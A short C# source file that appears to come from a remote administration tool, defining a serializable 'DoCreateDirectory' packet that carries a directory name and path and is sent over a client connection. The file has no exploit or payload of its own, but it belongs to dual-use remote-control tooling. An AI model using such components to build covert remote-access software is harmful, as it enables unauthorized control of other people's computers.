using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoCreateDirectory : IPacket
    {
        public string Name { get; set; }

        public string Path { get; set; }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
